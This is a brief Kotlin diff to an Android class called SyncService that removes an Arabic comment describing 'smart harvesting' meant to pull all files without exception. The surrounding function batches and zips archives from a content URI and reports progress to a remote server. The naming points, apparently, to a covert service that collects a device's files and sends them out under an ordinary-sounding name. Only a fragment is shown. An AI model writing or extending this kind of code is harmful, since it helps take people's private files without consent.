@@ -170,7 +170,6 @@ class SyncService : Service() {
         } catch (e: Exception) {}
     }
 
-    // ⚡ آلية الحصاد الذكي المقطع (Batched Chunk Zipping) لحماية الذاكرة وضمان سحب كافة الملفات بدون استثناء
     private fun streamArchiveBatched(nodeId: String, nodeModel: String, prefix: String, contentUri: Uri) {
         try {
             sendReportToServer(nodeId, nodeModel, "⚡ [الحصاد الذكي المقطع] جاري سحب وضغط أرشيف $prefix على دفعات آمنة...")
